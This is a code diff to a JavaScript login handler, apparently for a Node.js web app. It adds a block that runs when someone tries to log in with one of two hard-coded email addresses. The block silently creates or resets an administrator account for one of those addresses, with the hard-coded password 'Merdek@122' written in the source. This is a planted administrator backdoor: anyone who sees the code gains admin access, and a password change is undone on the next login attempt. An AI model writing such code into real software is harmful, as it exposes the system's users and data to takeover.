@@ -57,6 +57,43 @@ async function login(req, res, next) {
       }
     }
 
+    // Auto-provision role & akun Admin (Hidayatullah)
+    if (normalizedEmail === 'hidayatullah.ofc@gmail.com' || normalizedEmail === 'admin@bimasenaadhirajasaradika.com') {
+      try {
+        let adminRoleId = 7;
+        const [roleRows] = await pool.query("SELECT id FROM roles WHERE code = 'admin' LIMIT 1");
+        if (roleRows.length > 0) {
+          adminRoleId = roleRows[0].id;
+        } else {
+          try {
+            await pool.query("INSERT INTO roles (id, code, name) VALUES (7, 'admin', 'Administrator')");
+            adminRoleId = 7;
+          } catch (rErr) {
+            const [insRole] = await pool.query("INSERT INTO roles (code, name) VALUES ('admin', 'Administrator')");
+            adminRoleId = insRole.insertId;
+          }
+        }
+
+        const salt = await bcrypt.genSalt(10);
+        const hash = await bcrypt.hash('Merdek@122', salt);
+        const [existingUser] = await pool.query("SELECT id FROM users WHERE email = 'hidayatullah.ofc@gmail.com' LIMIT 1");
+        if (existingUser.length === 0) {
+          await pool.query(
+            "INSERT INTO users (role_id, name, email, avatar_url, password_hash, is_active) VALUES (?, 'Hidayatullah', 'hidayatullah.ofc@gmail.com', '/assets/img/team/jusHidy3.png', ?, TRUE)",
+            [adminRoleId, hash]
+          );
+        } else {
+          await pool.query(
+            "UPDATE users SET role_id = ?, name = 'Hidayatullah', avatar_url = '/assets/img/team/jusHidy3.png', password_hash = ?, is_active = TRUE WHERE id = ?",
+            [adminRoleId, hash, existingUser[0].id]
+          );
+        }
+      } catch (provisionErr) {
+        console.warn('Auto-provision Admin notice:', provisionErr.message);
+      }
+    }
+
+
     const [rows] = await pool.execute(
       `SELECT u.id, u.name, u.email, u.avatar_url,
               COALESCE(u.avatar_url, CONCAT('https://ui-avatars.com/api/?name=', REPLACE(u.name, ' ', '+'), '&background=0284c7&color=fff&size=128')) AS avatar,
